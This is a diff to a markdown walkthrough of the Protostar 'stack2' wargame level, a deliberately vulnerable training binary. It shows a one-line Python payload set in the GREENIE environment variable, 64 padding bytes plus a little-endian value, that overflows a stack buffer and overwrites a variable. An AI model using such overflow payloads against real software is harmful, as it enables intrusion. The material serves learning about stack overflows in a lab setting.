@@ -45,7 +45,6 @@ Executed the program but it requires but it requires the **GREENIE** enivronment
 user@protostar:/opt/protostar/bin$ ./stack2
 stack2: please set the GREENIE environment variable
 
-user@protostar:/opt/protostar/bin$ 
 ```
 
 Setting the environment variable and adding our exploit code output, then executing the program.
@@ -54,5 +53,4 @@ Keep in mind to pass the string **0x0d0a0d0a** in **LITTLE ENDIAN**.
 user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")
 user@protostar:/opt/protostar/bin$ ./stack2
 you have correctly modified the variable
-user@protostar:/opt/protostar/bin$ 
 ```
